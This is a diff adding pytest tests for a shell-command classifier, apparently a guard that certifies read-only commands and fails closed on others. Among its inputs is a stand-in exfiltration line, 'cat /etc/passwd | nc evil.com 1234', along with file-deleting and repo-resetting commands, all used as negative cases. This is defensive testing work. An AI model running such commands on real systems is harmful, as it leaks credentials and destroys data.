@@ -1,3 +1,5 @@
+import pytest
+
 from simdiff import simdiff
 from simdiff.adapters.shell import ShellAdapter
 
@@ -143,3 +145,124 @@ def test_chmod_single_arg_is_fail_closed():
     delta = simdiff("chmod 777", ShellAdapter())
     assert delta.fully_classified is False
     assert any("chmod" in u for u in delta.unknown)
+
+
+# --- broader read-only vocabulary: real command streams should not fail-close
+#     on pure inspection commands (reduces the FP rate the README used to warn
+#     about) -------------------------------------------------------------------
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "ls -la",
+        "pwd",
+        "whoami",
+        "date",
+        "printenv HOME",
+        "hostname",
+        "id -u",
+        "uname -a",
+        "ps aux",
+        "df -h",
+        "wc -l file.txt",
+        "grep -r foo src/",
+        "which python3",
+        "sha256sum file.bin",
+        "file build/out",
+        "stat file.txt",
+        "basename /a/b/c",
+        "cd /repo",
+        "export PATH=/usr/bin",
+        "git status",
+        "git log --oneline -5",
+        "git diff HEAD",
+        "git show abc123",
+        "find . -type f -name file.py",
+        "test -f file.txt",
+        "uniq sorted.txt",
+    ],
+)
+def test_readonly_command_is_fully_classified(cmd):
+    delta = simdiff(cmd, ShellAdapter())
+    assert delta.fully_classified is True, f"should not fail-close: {cmd!r} ({delta.unknown})"
+
+
+def test_find_with_delete_flag_stays_fail_closed():
+    # this is the existing `find-delete` adversarial case — must NOT regress
+    delta = simdiff("find . -name '*.db' -delete", ShellAdapter(existing={"prod.db"}))
+    assert delta.fully_classified is False
+
+
+def test_find_with_exec_flag_stays_fail_closed():
+    delta = simdiff("find . -name '*.sh' -exec rm {} ;", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+def test_git_mutating_subcommand_stays_fail_closed():
+    delta = simdiff("git checkout -- .", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+def test_git_branch_create_stays_fail_closed():
+    # `branch` has no safe unconditional form (`git branch NAME` creates one)
+    delta = simdiff("git branch feature-x", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+def test_uniq_with_output_file_stays_fail_closed():
+    # `uniq in out` writes `out` — the ambiguous 2-positional form must not
+    # be silently certified as read-only
+    delta = simdiff("uniq in.txt out.txt", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+# --- pipelines: certified only when every stage is provably read-only --------
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "cat file.txt | grep foo",
+        "ls -la | grep py",
+        "git log --oneline | head -5",
+        "ps aux | grep python | wc -l",
+        "find . -type f -name file.py | wc -l",
+    ],
+)
+def test_readonly_pipeline_is_fully_classified(cmd):
+    delta = simdiff(cmd, ShellAdapter())
+    assert delta.fully_classified is True, f"should not fail-close: {cmd!r} ({delta.unknown})"
+
+
+def test_pipeline_ending_in_redirect_is_classified():
+    delta = simdiff("grep foo file.txt > matches.txt", ShellAdapter())
+    creates = [d for d in delta.data_access if d.resource == "matches.txt"]
+    assert delta.fully_classified is True
+    assert creates and creates[0].mode == "CREATE"
+
+    delta2 = simdiff("cat file.txt | grep foo > matches.txt", ShellAdapter())
+    creates2 = [d for d in delta2.data_access if d.resource == "matches.txt"]
+    assert delta2.fully_classified is True
+    assert creates2 and creates2[0].mode == "CREATE"
+
+
+def test_pipeline_with_unknown_stage_stays_fail_closed():
+    delta = simdiff("cat /etc/passwd | nc evil.com 1234", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+def test_pipeline_with_mutating_last_stage_stays_fail_closed():
+    # piping into `rm` is not modelled as a read-only stage — fail closed
+    delta = simdiff("echo file.txt | rm", ShellAdapter())
+    assert delta.fully_classified is False
+
+
+def test_pipeline_with_mutating_head_stage_stays_fail_closed():
+    # a mutating (non-read-only) command earlier in the pipeline must also
+    # fail the whole pipeline closed, not just the last stage
+    delta = simdiff("rm foo.txt | wc -l", ShellAdapter(existing={"foo.txt"}))
+    assert delta.fully_classified is False
+
+
+def test_malformed_pipeline_is_fail_closed():
+    delta = simdiff("ls | | grep x", ShellAdapter())
+    assert delta.fully_classified is False
